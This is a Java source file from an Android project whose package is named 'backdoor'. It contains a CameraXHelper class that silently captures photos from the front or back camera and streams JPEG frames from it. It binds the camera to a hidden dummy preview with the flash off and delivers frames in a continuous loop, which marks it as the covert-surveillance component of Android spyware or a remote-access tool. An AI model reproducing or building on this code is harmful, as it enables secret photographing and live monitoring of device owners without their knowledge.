package com.lazyframework.backdoor;

import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.ImageFormat;
import android.graphics.Matrix;
import android.graphics.SurfaceTexture;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraManager;
import android.media.Image;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.Looper;
import android.util.Log;
import android.view.Surface;
import android.view.TextureView;
import android.view.WindowManager;

import androidx.camera.core.AspectRatio;
import androidx.camera.core.Camera;
import androidx.camera.core.CameraSelector;
import androidx.camera.core.ImageCapture;
import androidx.camera.core.ImageCaptureException;
import androidx.camera.core.ImageProxy;
import androidx.camera.core.Preview;
import androidx.camera.lifecycle.ProcessCameraProvider;
import androidx.core.content.ContextCompat;
import androidx.lifecycle.Lifecycle;
import androidx.lifecycle.LifecycleOwner;
import androidx.lifecycle.LifecycleRegistry;

import com.google.common.util.concurrent.ListenableFuture;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

public class CameraXHelper implements LifecycleOwner {
    private static final String TAG = "CameraXHelper";
    
    private Context context;
    private ProcessCameraProvider cameraProvider;
    private ImageCapture imageCapture;
    private Preview preview;
    private Camera camera;
    private ExecutorService cameraExecutor;
    private LifecycleRegistry lifecycleRegistry;
    private Handler mainHandler;
    
    // Photo
    private AtomicBoolean isTakingPhoto = new AtomicBoolean(false);
    private PhotoCallback photoCallback;
    
    // Streaming
    private boolean isStreaming = false;
    private StreamingFrameCallback streamCallback;
    private HandlerThread streamThread;
    private Handler streamHandler;
    private Runnable streamRunnable;
    private int streamQuality = 60;
    private int currentLensFacing = CameraSelector.LENS_FACING_BACK;
    private AtomicBoolean isCapturingFrame = new AtomicBoolean(false);
    
    // Dummy TextureView untuk Preview
    private TextureView dummyTextureView;
    
    public CameraXHelper(Context context) {
        this.context = context;
        this.cameraExecutor = Executors.newSingleThreadExecutor();
        this.mainHandler = new Handler(Looper.getMainLooper());
        this.lifecycleRegistry = new LifecycleRegistry(this);
        this.lifecycleRegistry.setCurrentState(Lifecycle.State.STARTED);
        this.dummyTextureView = new TextureView(context);
        
        // Setup streaming thread
        streamThread = new HandlerThread("CameraStreamThread");
        streamThread.start();
        streamHandler = new Handler(streamThread.getLooper());
        
        Log.d(TAG, "CameraXHelper initialized");
    }
    
    @Override
    public Lifecycle getLifecycle() {
        return lifecycleRegistry;
    }
    
    // ==================== PHOTO METHODS ====================
    
    public void takePhotoBack(PhotoCallback callback) {
        takePhoto(CameraSelector.LENS_FACING_BACK, callback);
    }
    
    public void takePhotoFront(PhotoCallback callback) {
        takePhoto(CameraSelector.LENS_FACING_FRONT, callback);
    }

    public void takePhotoForStream(PhotoCallback callback, int lensFacing) {
    takePhoto(lensFacing, callback);
    }
    
    private void takePhoto(int lensFacing, PhotoCallback callback) {
        if (isTakingPhoto.get()) {
            callback.onError("Already taking photo");
            return;
        }
        
        isTakingPhoto.set(true);
        this.photoCallback = callback;
        
        // Stop streaming if active
        boolean wasStreaming = isStreaming;
        if (wasStreaming) {
            stopStreamingInternal();
        }
        
        initCameraForPhoto(lensFacing);
    }
    
    private void initCameraForPhoto(int lensFacing) {
        ListenableFuture<ProcessCameraProvider> cameraProviderFuture = 
                ProcessCameraProvider.getInstance(context);
        
        cameraProviderFuture.addListener(() -> {
            try {
                cameraProvider = cameraProviderFuture.get(5, TimeUnit.SECONDS);
                
                if (cameraProvider == null) {
                    handlePhotoError("Camera provider is null");
                    return;
                }
                
                cameraProvider.unbindAll();
                
                CameraSelector cameraSelector = (lensFacing == CameraSelector.LENS_FACING_FRONT) ?
                        CameraSelector.DEFAULT_FRONT_CAMERA : CameraSelector.DEFAULT_BACK_CAMERA;
                
                // Create Preview (required)
                preview = new Preview.Builder()
                        .setTargetAspectRatio(AspectRatio.RATIO_4_3)
                        .setTargetRotation(getDisplayRotation())
                        .build();
                
                preview.setSurfaceProvider(dummyTextureView.getSurfaceProvider());
                
                // Create ImageCapture for photo
                imageCapture = new ImageCapture.Builder()
                        .setCaptureMode(ImageCapture.CAPTURE_MODE_MAXIMIZE_QUALITY)
                        .setTargetRotation(getDisplayRotation())
                        .setJpegQuality(95)
                        .build();
                
                camera = cameraProvider.bindToLifecycle(
                        this, cameraSelector, preview, imageCapture);
                
                Log.d(TAG, "Camera bound for photo, taking picture in 500ms");
                
                // Delay to let camera stabilize
                mainHandler.postDelayed(this::executeTakePhoto, 500);
                
            } catch (Exception e) {
                Log.e(TAG, "Failed to init camera for photo: " + e.getMessage(), e);
                handlePhotoError("Camera init failed: " + e.getMessage());
            }
        }, ContextCompat.getMainExecutor(context));
    }
    
    private void executeTakePhoto() {
        if (imageCapture == null || cameraProvider == null) {
            handlePhotoError("ImageCapture is null");
            return;
        }
        
        File photoFile = createPhotoFile();
        if (photoFile == null) {
            handlePhotoError("Failed to create photo file");
            return;
        }
        
        Log.d(TAG, "Taking photo to: " + photoFile.getAbsolutePath());
        
        ImageCapture.OutputFileOptions outputOptions = 
                new ImageCapture.OutputFileOptions.Builder(photoFile).build();
        
        imageCapture.takePicture(outputOptions, cameraExecutor, 
                new ImageCapture.OnImageSavedCallback() {
                    @Override
                    public void onImageSaved(ImageCapture.OutputFileResults outputFileResults) {
                        Log.d(TAG, "Photo saved successfully: " + photoFile.length() + " bytes");
                        
                        if (photoFile.exists() && photoFile.length() > 0) {
                            if (photoCallback != null) {
                                photoCallback.onSuccess(photoFile.getAbsolutePath());
                            }
                        } else {
                            handlePhotoError("Photo file is empty");
                        }
                        
                        cleanupPhoto();
                    }
                    
                    @Override
                    public void onError(ImageCaptureException exception) {
                        Log.e(TAG, "Photo capture failed: " + exception.getMessage(), exception);
                        handlePhotoError("Capture failed: " + exception.getMessage());
                        cleanupPhoto();
                    }
                });
        
        // Timeout handler
        mainHandler.postDelayed(() -> {
            if (isTakingPhoto.get()) {
                handlePhotoError("Photo capture timeout");
                cleanupPhoto();
            }
        }, 10000);
    }
    
    private File createPhotoFile() {
        try {
            File photoDir = context.getExternalFilesDir(Environment.DIRECTORY_PICTURES);
            if (photoDir == null || !photoDir.exists()) {
                photoDir = context.getFilesDir();
            }
            
            String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss_SSS", Locale.US).format(new Date());
            String fileName = "IMG_" + timestamp + ".jpg";
            
            return new File(photoDir, fileName);
        } catch (Exception e) {
            Log.e(TAG, "Error creating photo file: " + e.getMessage());
            return null;
        }
    }
    
    private void handlePhotoError(String error) {
        Log.e(TAG, "Photo error: " + error);
        if (photoCallback != null) {
            photoCallback.onError(error);
        }
        isTakingPhoto.set(false);
        photoCallback = null;
    }
    
    private void cleanupPhoto() {
        isTakingPhoto.set(false);
        photoCallback = null;
        
        if (cameraProvider != null) {
            try {
                cameraProvider.unbindAll();
            } catch (Exception e) {
                Log.e(TAG, "Error unbinding camera: " + e.getMessage());
            }
        }
        cameraProvider = null;
        imageCapture = null;
        preview = null;
        camera = null;
    }
    
    // ==================== STREAMING METHODS ====================
    
    public void startStreamingFrames(int lensFacing, int quality, StreamingFrameCallback callback) {
        Log.d(TAG, "startStreamingFrames - lensFacing: " + lensFacing + ", quality: " + quality);
        
        if (isStreaming) {
            Log.d(TAG, "Already streaming, stopping first");
            stopStreaming();
        }
        
        if (!hasCameraPermission()) {
            if (callback != null) {
                callback.onError("No camera permission");
            }
            return;
        }
        
        this.streamCallback = callback;
        this.streamQuality = Math.max(30, Math.min(90, quality));
        this.currentLensFacing = lensFacing;
        this.isStreaming = true;
        
        // Stop any ongoing photo operation
        if (isTakingPhoto.get()) {
            isTakingPhoto.set(false);
            photoCallback = null;
        }
        
        initCameraForStreaming();
    }
    
    private void initCameraForStreaming() {
        ListenableFuture<ProcessCameraProvider> cameraProviderFuture = 
                ProcessCameraProvider.getInstance(context);
        
        cameraProviderFuture.addListener(() -> {
            try {
                if (cameraProvider != null) {
                    cameraProvider.unbindAll();
                }
                
                cameraProvider = cameraProviderFuture.get(5, TimeUnit.SECONDS);
                
                if (cameraProvider == null) {
                    handleStreamingError("Camera provider is null");
                    return;
                }
                
                CameraSelector cameraSelector = (currentLensFacing == CameraSelector.LENS_FACING_FRONT) ?
                        CameraSelector.DEFAULT_FRONT_CAMERA : CameraSelector.DEFAULT_BACK_CAMERA;
                
                // Create Preview (REQUIRED)
                preview = new Preview.Builder()
                        .setTargetAspectRatio(AspectRatio.RATIO_4_3)
                        .setTargetRotation(getDisplayRotation())
                        .build();
                
                preview.setSurfaceProvider(dummyTextureView.getSurfaceProvider());
                
                // Create ImageCapture for streaming
                imageCapture = new ImageCapture.Builder()
                        .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                        .setTargetRotation(getDisplayRotation())
                        .setJpegQuality(streamQuality)
                        .setFlashMode(ImageCapture.FLASH_MODE_OFF)
                        .build();
                
                camera = cameraProvider.bindToLifecycle(
                        this, cameraSelector, preview, imageCapture);
                
                Log.d(TAG, "Streaming camera bound successfully");
                
                // Start frame capture after stabilization
                mainHandler.postDelayed(() -> {
                    if (isStreaming) {
                        startFrameCaptureLoop();
                    }
                }, 1000);
                
            } catch (Exception e) {
                Log.e(TAG, "Failed to init streaming camera: " + e.getMessage(), e);
                handleStreamingError("Camera init failed: " + e.getMessage());
            }
        }, ContextCompat.getMainExecutor(context));
    }
    
    private void startFrameCaptureLoop() {
        if (streamRunnable != null) {
            streamHandler.removeCallbacks(streamRunnable);
        }
        
        streamRunnable = new Runnable() {
            private int frameCount = 0;
            private long lastLogTime = System.currentTimeMillis();
            
            @Override
            public void run() {
                if (!isStreaming || imageCapture == null || streamCallback == null) {
                    if (isStreaming) {
                        streamHandler.postDelayed(this, 100);
                    }
                    return;
                }
                
                // Prevent multiple simultaneous captures
                if (isCapturingFrame.getAndSet(true)) {
                    streamHandler.postDelayed(this, 50);
                    return;
                }
                
                imageCapture.takePicture(ContextCompat.getMainExecutor(context),
                        new ImageCapture.OnImageCapturedCallback() {
                            @Override
                            public void onCaptureSuccess(ImageProxy image) {
                                isCapturingFrame.set(false);
                                
                                if (isStreaming && streamCallback != null && image != null) {
                                    byte[] jpegData = convertImageToJpeg(image);
                                    if (jpegData != null && jpegData.length > 500) {
                                        streamCallback.onFrame(jpegData);
                                        frameCount++;
                                        
                                        long now = System.currentTimeMillis();
                                        if (now - lastLogTime > 2000) {
                                            Log.d(TAG, "Stream FPS: " + frameCount + " frames, size: " + jpegData.length + " bytes");
                                            frameCount = 0;
                                            lastLogTime = now;
                                        }
                                    }
                                }
                                
                                if (image != null) {
                                    image.close();
                                }
                                
                                // Schedule next frame (approx 10-15 FPS)
                                if (isStreaming) {
                                    streamHandler.postDelayed(this, 80);
                                }
                            }
                            
                            @Override
                            public void onError(ImageCaptureException exception) {
                                isCapturingFrame.set(false);
                                Log.e(TAG, "Frame capture error: " + exception.getMessage());
                                
                                if (isStreaming) {
                                    streamHandler.postDelayed(this, 100);
                                }
                            }
                        });
            }
        };
        
        streamHandler.post(streamRunnable);
        Log.d(TAG, "Frame capture loop started");
    }
    
    private byte[] convertImageToJpeg(ImageProxy image) {
        if (image == null) return null;
        
        try {
            // Method 1: Direct JPEG from CameraX
            ByteBuffer buffer = image.getPlanes()[0].getBuffer();
            byte[] data = new byte[buffer.remaining()];
            buffer.get(data);
            
            // Check if valid JPEG (starts with FF D8)
            if (data.length > 10 && data[0] == (byte) 0xFF && data[1] == (byte) 0xD8) {
                return data;
            }
            
            // Method 2: Convert through Bitmap
            Bitmap bitmap = imageToBitmap(image);
            if (bitmap != null) {
                // Resize for streaming to reduce bandwidth
                int targetWidth = 640;
                int targetHeight = 480;
                
                float scaleX = (float) targetWidth / bitmap.getWidth();
                float scaleY = (float) targetHeight / bitmap.getHeight();
                float scale = Math.min(scaleX, scaleY);
                
                int newWidth = Math.round(bitmap.getWidth() * scale);
                int newHeight = Math.round(bitmap.getHeight() * scale);
                
                if (newWidth > 0 && newHeight > 0) {
                    Bitmap resized = Bitmap.createScaledBitmap(bitmap, newWidth, newHeight, true);
                    bitmap.recycle();
                    bitmap = resized;
                }
                
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                bitmap.compress(Bitmap.CompressFormat.JPEG, streamQuality, baos);
                bitmap.recycle();
                
                byte[] jpegData = baos.toByteArray();
                baos.close();
                
                if (jpegData.length > 0) {
                    return jpegData;
                }
            }
            
            return null;
            
        } catch (Exception e) {
            Log.e(TAG, "Convert image to JPEG error: " + e.getMessage());
            return null;
        }
    }
    
    private Bitmap imageToBitmap(ImageProxy image) {
        if (image == null) return null;
        
        try {
            Image mediaImage = image.getImage();
            if (mediaImage == null) return null;
            
            if (mediaImage.getFormat() == ImageFormat.JPEG) {
                ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                byte[] data = new byte[buffer.remaining()];
                buffer.get(data);
                return BitmapFactory.decodeByteArray(data, 0, data.length);
            }
            
            // Convert YUV_420_888 to Bitmap
            if (mediaImage.getFormat() == ImageFormat.YUV_420_888) {
                Image.Plane yPlane = mediaImage.getPlanes()[0];
                Image.Plane uPlane = mediaImage.getPlanes()[1];
                Image.Plane vPlane = mediaImage.getPlanes()[2];
                
                int width = mediaImage.getWidth();
                int height = mediaImage.getHeight();
                
                ByteBuffer yBuffer = yPlane.getBuffer();
                ByteBuffer uBuffer = uPlane.getBuffer();
                ByteBuffer vBuffer = vPlane.getBuffer();
                
                int yRowStride = yPlane.getRowStride();
                int uvRowStride = uPlane.getRowStride();
                int uvPixelStride = uPlane.getPixelStride();
                
                int[] pixels = new int[width * height];
                
                for (int y = 0; y < height; y++) {
                    for (int x = 0; x < width; x++) {
                        int yIndex = y * yRowStride + x;
                        int uvIndex = (y / 2) * uvRowStride + (x / 2) * uvPixelStride;
                        
                        int yValue = yBuffer.get(yIndex) & 0xFF;
                        int uValue = uBuffer.get(uvIndex) & 0xFF;
                        int vValue = vBuffer.get(uvIndex) & 0xFF;
                        
                        // YUV to RGB conversion
                        int r = (int) (yValue + 1.402f * (vValue - 128));
                        int g = (int) (yValue - 0.344f * (uValue - 128) - 0.714f * (vValue - 128));
                        int b = (int) (yValue + 1.772f * (uValue - 128));
                        
                        r = Math.max(0, Math.min(255, r));
                        g = Math.max(0, Math.min(255, g));
                        b = Math.max(0, Math.min(255, b));
                        
                        pixels[y * width + x] = (0xFF << 24) | (r << 16) | (g << 8) | b;
                    }
                }
                
                return Bitmap.createBitmap(pixels, width, height, Bitmap.Config.ARGB_8888);
            }
            
            return null;
            
        } catch (Exception e) {
            Log.e(TAG, "Image to bitmap error: " + e.getMessage());
            return null;
        }
    }
    
    private void handleStreamingError(String error) {
        Log.e(TAG, "Streaming error: " + error);
        if (streamCallback != null) {
            streamCallback.onError(error);
        }
        stopStreamingInternal();
    }
    
    public void stopStreaming() {
        Log.d(TAG, "stopStreaming called");
        stopStreamingInternal();
    }
    
    private void stopStreamingInternal() {
        isStreaming = false;
        
        if (streamRunnable != null && streamHandler != null) {
            streamHandler.removeCallbacks(streamRunnable);
            streamRunnable = null;
        }
        
        isCapturingFrame.set(false);
        
        if (cameraProvider != null) {
            try {
                cameraProvider.unbindAll();
            } catch (Exception e) {
                Log.e(TAG, "Error unbinding camera: " + e.getMessage());
            }
        }
        
        cameraProvider = null;
        imageCapture = null;
        preview = null;
        camera = null;
        streamCallback = null;
        
        Log.d(TAG, "Streaming stopped");
    }
    
    public boolean isStreaming() {
        return isStreaming;
    }
    
    public void setStreamQuality(int quality) {
        this.streamQuality = Math.max(30, Math.min(90, quality));
    }
    
    // ==================== UTILITY METHODS ====================
    
    private int getDisplayRotation() {
        WindowManager wm = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
        if (wm != null) {
            int rotation = wm.getDefaultDisplay().getRotation();
            switch (rotation) {
                case Surface.ROTATION_0: return 0;
                case Surface.ROTATION_90: return 90;
                case Surface.ROTATION_180: return 180;
                case Surface.ROTATION_270: return 270;
                default: return 0;
            }
        }
        return 0;
    }
    
    private boolean hasCameraPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            return ContextCompat.checkSelfPermission(context, android.Manifest.permission.CAMERA)
                    == PackageManager.PERMISSION_GRANTED;
        }
        return true;
    }
    
    public void getCameraInfo(CameraInfoCallback callback) {
        CameraManager cameraManager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
        try {
            boolean hasBack = false;
            boolean hasFront = false;
            String[] cameraIds = cameraManager.getCameraIdList();
            for (String id : cameraIds) {
                CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(id);
                Integer facing = characteristics.get(CameraCharacteristics.LENS_FACING);
                if (facing != null) {
                    if (facing == CameraCharacteristics.LENS_FACING_BACK) {
                        hasBack = true;
                    } else if (facing == CameraCharacteristics.LENS_FACING_FRONT) {
                        hasFront = true;
                    }
                }
            }
            callback.onResult(hasBack, hasFront);
        } catch (CameraAccessException e) {
            callback.onError(e.getMessage());
        }
    }
    
    public void release() {
        Log.d(TAG, "Releasing CameraXHelper");
        stopStreamingInternal();
        
        if (streamThread != null) {
            streamThread.quitSafely();
        }
        
        if (cameraExecutor != null) {
            cameraExecutor.shutdown();
            try {
                cameraExecutor.awaitTermination(2, TimeUnit.SECONDS);
            } catch (InterruptedException e) {
                Log.e(TAG, "Executor shutdown interrupted");
            }
        }
        
        lifecycleRegistry.setCurrentState(Lifecycle.State.DESTROYED);
        context = null;
    }
    
    // ==================== CALLBACK INTERFACES ====================
    
    public interface PhotoCallback {
        void onSuccess(String filePath);
        void onError(String error);
    }
    
    public interface CameraInfoCallback {
        void onResult(boolean hasBackCamera, boolean hasFrontCamera);
        void onError(String error);
    }
    
    public interface StreamingFrameCallback {
        void onFrame(byte[] jpegData);
        void onError(String error);
    }
}
